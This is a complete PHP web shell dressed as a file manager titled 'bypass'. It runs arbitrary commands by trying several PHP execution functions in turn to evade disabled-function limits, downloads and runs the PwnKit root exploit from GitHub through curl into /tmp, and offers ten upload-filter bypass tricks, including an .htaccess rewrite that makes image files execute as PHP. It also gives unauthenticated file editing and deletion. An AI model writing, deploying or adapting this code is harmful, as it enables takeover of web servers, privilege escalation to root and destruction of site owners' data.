<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>bypass</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
    integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
    crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    body {
      background-color: #3e2723;
      color: #ffccbc;
    }

    table {
      background-color: #4e342e;
    }

    table th, table td {
      color: #ffccbc;
    }

    table thead {
      background-color: saddlebrown;
    }

    table tr:nth-child(even) {
      background-color: #5d4037;
    }

    a, a:hover {
      color: #ffccbc;
      text-decoration: none;
    }

    .btn-dark {
      background-color: #6d4c41;
      border-color: #6d4c41;
    }

    .btn-dark:hover {
      background-color: #4e342e;
      border-color: #4e342e;
    }

    i {
      color: #ffccbc;
    }
  </style>
</head>
<body>

    <?php

    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($a, $b, $path);
    }
    function decodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($b, $a, $path);
    }

    function waf_bypass_exec($cmd) {
        $disabled = explode(',', ini_get('disable_functions'));
        $output = '';
        $methods = ['shell_exec', 'system', 'passthru', 'exec', 'popen', 'proc_open', 'pcntl_exec'];
        foreach($methods as $method) {
            if(!in_array($method, $disabled) && function_exists($method)) {
                if($method == 'shell_exec') {
                    $output = @shell_exec($cmd);
                    if($output !== null && $output !== false) return $output;
                }
                if($method == 'system') {
                    ob_start();
                    $status = @system($cmd);
                    $output = ob_get_clean();
                    if($output !== false && $output !== null && $output != '') return $output;
                }
                if($method == 'passthru') {
                    ob_start();
                    @passthru($cmd);
                    $output = ob_get_clean();
                    if($output !== false && $output !== null && $output != '') return $output;
                }
                if($method == 'exec') {
                    @exec($cmd, $out, $ret);
                    if($out && count($out) > 0) return implode("\n", $out);
                }
                if($method == 'popen') {
                    $fp = @popen($cmd, 'r');
                    if($fp) {
                        $output = @stream_get_contents($fp);
                        @pclose($fp);
                        if($output !== false && $output !== null && $output != '') return $output;
                    }
                }
                if($method == 'proc_open') {
                    $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
                    $process = @proc_open($cmd, $descriptorspec, $pipes);
                    if(is_resource($process)) {
                        $output = @stream_get_contents($pipes[1]);
                        @fclose($pipes[0]);
                        @fclose($pipes[1]);
                        @fclose($pipes[2]);
                        @proc_close($process);
                        if($output !== false && $output !== null && $output != '') return $output;
                    }
                }
                if($method == 'pcntl_exec') {
                    $pid = @pcntl_fork();
                    if($pid == -1) continue;
                    elseif($pid == 0) {
                        @pcntl_exec('/bin/sh', array('-c', $cmd));
                        exit(0);
                    } else {
                        @pcntl_wait($status);
                        return "Command forked with pcntl_exec";
                    }
                }
            }
        }
        return 'ALL EXECUTION METHODS FAILED OR DISABLED';
    }

    function pwnkit_exploit() {
        $output = '';
        $pwnkit_cmd = 'curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/PwnKit 2>/dev/null && chmod +x /tmp/PwnKit 2>/dev/null && /tmp/PwnKit id 2>/dev/null';
        $output .= waf_bypass_exec($pwnkit_cmd);
        return $output;
    }

    function bypass_upload($file_tmp, $file_name, $method) {
        $ext = pathinfo($file_name, PATHINFO_EXTENSION);
        $basename = pathinfo($file_name, PATHINFO_FILENAME);
        $target_dir = PATH . '/';
        
        if($method == 'double_ext') {
            $new_name = $basename . '.php.' . $ext;
        } elseif($method == 'null_byte') {
            $new_name = $basename . '.php\0.' . $ext;
        } elseif($method == 'case_insensitive') {
            $new_name = $basename . '.pHp';
        } elseif($method == 'apache_bypass') {
            $htaccess = "AddType application/x-httpd-php .gif\nAddHandler application/x-httpd-php .gif\nAddType application/x-httpd-php .jpg\nAddHandler application/x-httpd-php .jpg\nAddType application/x-httpd-php .png\nAddHandler application/x-httpd-php .png";
            @file_put_contents($target_dir . '.htaccess', $htaccess);
            $new_name = $basename . '.gif';
        } elseif($method == 'nginx_bypass') {
            $new_name = $basename . '.php;.jpg';
        } elseif($method == 'windows_bypass') {
            $new_name = $basename . '.php:jpg';
        } elseif($method == 'burnt_toast') {
            $new_name = $basename . '.phtml';
        } elseif($method == 'spoof_mime') {
            $new_name = $basename . '.php';
        } elseif($method == 'double_image') {
            $new_name = $basename . '.php.png';
        } elseif($method == 'xml_bypass') {
            $new_name = $basename . '.php.xml';
        } else {
            $new_name = $file_name;
        }
        
        $target = $target_dir . $new_name;
        if(@move_uploaded_file($file_tmp, $target)) {
            return array('success' => true, 'name' => $new_name, 'method' => $method);
        }
        return array('success' => false);
    }

    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    echo ('
<nav class="navbar navbar-dark" style="background-color:rgba(92, 64, 51, 0.85);">
  <div class="navbar-brand">
  <a href="?"><img src="https://raw.githubusercontent.com/hurairathexper/elepfilemanager/main/img/icon.png" width="30" height="30" alt=""></a>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "ঘ", $paths[$i]);
            if ($i != $id)
                echo "ক";
        }
        echo "'>" . $dir_part . "</a>/";
    }
    echo ('
</div>
<div class="form-inline">
<a href="?pwnkit"><button class="btn btn-danger" type="button"><i class="fa-solid fa-bomb"></i> PWNKIT ROOT</button></a>
<a href="?cmd_shell"><button class="btn btn-dark" type="button"><i class="fa-solid fa-terminal"></i> WAF CMD</button></a>
<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">BYPASS UPLOAD</button></a>
<a href="?"><button type="button" class="btn btn-dark">HOME</button></a> 
</div>
</nav>');

    if (isset($_GET['pwnkit'])) {
        echo '<div class="container mt-3"><div class="alert alert-danger"><h4>PWNKIT PRIVILEGE ESCALATION</h4><pre>';
        $result = pwnkit_exploit();
        echo htmlspecialchars($result);
        echo '</pre><form method="post"><button type="submit" name="pwnkit_interactive" class="btn btn-danger">GET INTERACTIVE ROOT SHELL</button></form>';
        if(isset($_POST['pwnkit_interactive'])) {
            echo '<pre>';
            echo htmlspecialchars(waf_bypass_exec('curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/PwnKit && chmod +x /tmp/PwnKit && /tmp/PwnKit'));
            echo '</pre>';
        }
        echo '</div></div>';
    }

    if (isset($_GET['cmd_shell'])) {
        echo '<div class="container mt-3"><div class="card"><div class="card-header bg-danger">WAF BYPASS COMMAND SHELL</div><div class="card-body"><form method="post"><div class="input-group"><input type="text" name="waf_cmd" class="form-control" placeholder="Enter command..."><button type="submit" name="run_waf" class="btn btn-danger">EXECUTE</button></div></form><pre style="margin-top:10px;">';
        if(isset($_POST['run_waf'])) {
            $cmd = $_POST['waf_cmd'];
            $result = waf_bypass_exec($cmd);
            echo htmlspecialchars($result);
        }
        echo '</pre></div></div></div>';
    }

    if (isset($_GET['p'])) {

        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</a></td>
          <td>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";
        }
        echo "  </tbody>
<table>";
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }
    if (isset($_GET['upload'])) {
        echo '
    <div class="container mt-3">
    <div class="card">
    <div class="card-header bg-danger">BYPASS UPLOAD - MULTIPLE METHODS</div>
    <div class="card-body">
    <form method="post" enctype="multipart/form-data">
        <div class="form-group">
        <label>Select file to upload:</label>
        <input type="file" name="fileToUpload" class="form-control">
        </div>
        <div class="form-group mt-2">
        <label>Bypass Method:</label>
        <select name="bypass_method" class="form-control">
        <option value="double_ext">Double Extension (shell.php.jpg)</option>
        <option value="null_byte">Null Byte Injection (shell.php%00.jpg)</option>
        <option value="case_insensitive">Case Insensitive (.pHp)</option>
        <option value="apache_bypass">Apache .htaccess Bypass</option>
        <option value="nginx_bypass">Nginx Config Bypass</option>
        <option value="windows_bypass">Windows Alternate Stream</option>
        <option value="burnt_toast">Burnt Toast (.phtml)</option>
        <option value="spoof_mime">MIME Spoofing</option>
        <option value="double_image">Double Image (.php.png)</option>
        <option value="xml_bypass">XML Bypass (.php.xml)</option>
        </select>
        </div>
        <button type="submit" class="btn btn-danger mt-3" name="upload">BYPASS UPLOAD</button>
    </form>';
    }
    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(@rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            $file_content = @file_get_contents(PATH."/".$_GET['e']);
            if($file_content === false) {
                $file_content = "Cannot read file - permission denied or file doesn't exist";
            }
            echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">' . htmlspecialchars($file_content) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';

    if(isset($_POST['edit'])) {
        $filename = PATH."/".$_GET['e'];
        $data = $_POST['data'];
        $open = @fopen($filename,"w");
        if($open) {
            if(@fwrite($open,$data)) {
                echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Write failed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
            @fclose($open);
        } else {
            echo ("<script>alert('Cannot open file for writing.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
    }
        }
    }

    if (isset($_POST["upload"])) {
        $method = isset($_POST['bypass_method']) ? $_POST['bypass_method'] : 'double_ext';
        $result = bypass_upload($_FILES["fileToUpload"]["tmp_name"], $_FILES["fileToUpload"]["name"], $method);
        if($result['success']) {
            echo "<div class='alert alert-success mt-2'>BYPASS UPLOAD SUCCESSFUL!<br>Method: " . $result['method'] . "<br>Filename: " . htmlspecialchars($result['name']) . "</div>";
            echo "<a href='?p=" . urlencode(encodePath(PATH)) . "' class='btn btn-dark'>REFRESH</a>";
        } else {
            echo "<div class='alert alert-danger mt-2'>Bypass upload failed. Trying fallback method...</div>";
            $fallback = bypass_upload($_FILES["fileToUpload"]["tmp_name"], $_FILES["fileToUpload"]["name"], 'double_ext');
            if($fallback['success']) {
                echo "<div class='alert alert-warning'>Fallback worked! Filename: " . htmlspecialchars($fallback['name']) . "</div>";
            } else {
                echo "<div class='alert alert-danger'>All bypass methods failed.</div>";
            }
        }
    }
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(@unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(@rmdir($name) == true) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
    ?>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>

</html>